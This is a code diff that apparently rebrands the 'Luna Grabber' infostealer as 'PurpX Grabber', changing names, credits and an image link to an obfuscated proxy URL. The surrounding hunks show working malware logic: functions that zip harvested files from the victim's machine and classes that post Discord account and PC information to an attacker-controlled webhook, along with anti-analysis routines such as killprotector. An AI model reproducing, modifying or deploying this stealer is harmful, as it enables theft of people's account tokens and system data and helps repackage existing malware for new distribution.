@@ -87,7 +87,7 @@ def main(webhook: str):
     os.remove(_file)
 
 
-def Luna(webhook: str):
+def PurpX(webhook: str):
     if __CONFIG__["anti_spam"]:
         AntiSpam()
 
@@ -193,7 +193,7 @@ def killprotector():
 
 
 def zipup():
-    _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
+    _zipfile = os.path.join(localappdata, f'PurpX-Logged-{os.getlogin()}.zip')
     zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
     for dirname, _, files in os.walk(temp_path):
         for filename in files:
@@ -224,7 +224,7 @@ class PcInfo:
         data = {
             "embeds": [
                 {
-                    "title": "Luna Logger",
+                    "title": "PurpX Logger",
                     "color": 5639644,
                     "fields": [
                         {
@@ -233,14 +233,14 @@ class PcInfo:
                         }
                     ],
                     "footer": {
-                        "text": "Luna Grabber | Created By Smug"
+                        "text": "PurpX Grabber | Created By Razzy"
                     },
                     "thumbnail": {
-                        "url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+                        "url": "https://phantomnetwork.cloud/uv/service/hvtrs8%2F-mgdka%2Ctgnmr%2Ccmm-X790Lg3n-SQCACAA%2Feul-wzk.eid"
                     }
                 }
             ],
-            "username": "Luna",
+            "username": "PurpX",
             "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
         }
 
@@ -408,11 +408,11 @@ class Discord:
                                         "url": info['ThumbnailUrl']
                                     },
                                     "footer": {
-                                        "text": "Luna Grabber | Created By Smug"
+                                        "text": "PurpX Grabber | Created By Razzy"
                                     },
                                 }
                             ],
-                            "username": "Luna",
+                            "username": "Razzy",
                             "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
                         }
                         requests.post(webhook, json=data)
@@ -472,11 +472,11 @@ class Discord:
                             "url": avatar_url
                         },
                         "footer": {
-                            "text": "Luna Grabber | Created By Smug"
+                            "text": "PurpX Grabber | Created By Razzy"
                         },
                     }
                 ],
-                "username": "Luna",
+                "username": "PurpX",
                 "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
             }
 
@@ -495,7 +495,7 @@ class Discord:
         image.close()
 
         webhook_data = {
-            "username": "Luna",
+            "username": "PurpX",
             "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
             "embeds": [
                 {
